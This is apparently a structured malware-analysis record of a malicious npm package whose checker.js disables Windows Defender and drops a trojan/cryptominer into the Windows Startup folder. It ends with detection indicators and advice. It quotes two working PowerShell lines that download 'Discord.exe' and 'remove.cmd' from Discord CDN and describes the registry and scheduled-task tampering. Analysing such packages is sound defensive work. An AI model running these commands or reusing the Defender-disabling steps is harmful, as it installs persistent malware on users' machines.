package_info.why_malicious: The package contains heavily obfuscated JavaScript code that, upon installation or import, disables Windows Defender and related security protections, downloads and installs a known trojan/cryptominer from Discord CDN, and establishes persistence by placing the payload in the Startup folder. Its actions are entirely inconsistent with its claimed functionality and are designed to compromise, persist, and exploit victim systems while evading detection.

execution_context.trigger: import-time or runtime (when checker.js is loaded or executed)

malicious_snippets.code_behavior: At import-time or runtime, the code executes a series of Windows registry modifications and disables scheduled Defender tasks, altering system security settings to disable Windows Defender, tamper protection, real-time protection, and related features, resulting in the system being left unprotected and vulnerable to further compromise.

malice_analysis.why_suspicious: The code programmatically disables multiple Windows Defender protections and related security features, which is a common tactic used by malware to evade detection and facilitate further malicious activity.
malice_analysis.violated_expectations: A legitimate npm package should never alter system-level security settings or disable antivirus/antimalware protections without explicit user consent and clear justification.
malice_analysis.similar_legitimate_use: Enterprise IT scripts or deployment tools may disable Defender for compatibility reasons, but this is never appropriate in a userland npm package or without explicit administrative approval.
key_indicators: Direct registry modifications targeting Windows Defender and security features
Disabling real-time protection and tamper protection via registry keys
Disabling scheduled Defender tasks using schtasks
Obfuscated JavaScript code to conceal malicious intent

execution_context.trigger: import-time or runtime (after disabling security protections)

malicious_snippets.code_snippet:
cmd('runSync')('powershell -c Invoke-WebRequest -Uri https://cdn.discordapp.com/attachments/982769804823205/982820209623296860/Discord.exe -OutFile %USERPROFILE%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Discord.exe');
cmd('runSync')('powershell -c Invoke-WebRequest -Uri https://cdn.discordapp.com/attachments/982769804823205/982820209944326669/remove.cmd -OutFile remove.cmd');
malicious_snippets.code_behavior: At import-time or runtime, the code uses PowerShell to download a trojan/cryptominer binary ('Discord.exe') and a secondary script ('remove.cmd') from Discord CDN, saving the binary to the user's Startup folder and the script to the local directory, enabling persistence and facilitating further malicious actions.

malice_analysis.why_suspicious: The code downloads and saves executable files from an external, non-official source (Discord CDN) and places a binary in the Startup folder, which is a well-known method for establishing persistence and delivering malware.
malice_analysis.violated_expectations: Legitimate npm packages should not download or execute external binaries, especially from non-official sources, nor should they modify the Startup folder without user knowledge and consent.
malice_analysis.similar_legitimate_use: Legitimate updaters or installers may fetch binaries, but never from Discord CDN or without explicit user consent and provenance verification.
key_indicators: Use of Discord CDN as a payload delivery mechanism
Dropping an executable into the Startup folder for persistence
Downloading and saving additional scripts for further execution
PowerShell command execution embedded in JavaScript

execution_context.trigger: runtime (when Discord.exe is executed via Startup at system boot)

malicious_snippets.code_behavior: At system startup, the trojan binary executes, decrypts and loads an embedded malicious payload, and initiates further malicious activity such as cryptomining or system compromise, resulting in persistent exploitation of the victim system.

malice_analysis.why_suspicious: The binary is a known trojan/cryptominer, contains encrypted payloads, and is delivered and executed by a malicious npm package, indicating clear intent to compromise and exploit the system.
malice_analysis.violated_expectations: No npm package should ever install or execute a .NET binary on user systems, especially one with encrypted payloads and known malicious classification.
malice_analysis.similar_legitimate_use: There is no legitimate use case for an npm package to install and execute a .NET binary in this context.
key_indicators: Execution from the Startup folder to ensure persistence
Known trojan/cryptominer classification by VirusTotal and other AV engines
Obfuscated or minimal code structure to hinder analysis

attack_chain.action: Obfuscated JavaScript disables Windows Defender and related protections by modifying registry keys and disabling scheduled tasks.
attack_chain.leads_to: System security protections are disabled, leaving the system unprotected and enabling subsequent malware actions.

attack_chain.action: Malicious code downloads and drops a trojan/cryptominer binary ('Discord.exe') and a secondary script ('remove.cmd') from Discord CDN using PowerShell, saving the binary to the Startup folder.
attack_chain.leads_to: Trojan binary is placed in the Startup folder for persistence and is set to execute at system startup.

attack_chain.action: Trojan binary ('Discord.exe') executes at system startup, decrypts and runs embedded malicious payloads, performing cryptomining or further system compromise.
attack_chain.leads_to: System is persistently compromised, resources may be stolen, and further attacks or data theft can occur.

behavioral_signatures: Obfuscated JavaScript in npm packages that executes shell or PowerShell commands to modify system security settings
Registry modifications specifically targeting Windows Defender and related security features
Downloading executables or scripts from Discord CDN or other non-standard, non-official sources
Dropping or creating binaries in Startup folders to establish persistence
Execution of .NET binaries with encrypted payloads from user Startup locations
file_indicators: package/checker.js containing obfuscated or suspicious code
remove.cmd script in the package working directory
Modified registry keys under HKLM\Software\Microsoft\Windows Defender and related subkeys
Disabled scheduled task: Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh
detection_knowledge.how_to_detect: Monitor npm packages for obfuscated JavaScript that executes shell or PowerShell commands, especially those modifying Windows Defender registry keys or disabling scheduled tasks. Flag any package that downloads executables or scripts from Discord CDN or other non-standard sources. Alert on creation of suspicious binaries in Startup folders and on registry changes that disable security features. Use YARA rules to detect obfuscated code patterns, PowerShell invocation, and known malicious payload hashes. Correlate file creation events in Startup folders with network downloads from Discord CDN to identify persistence mechanisms.
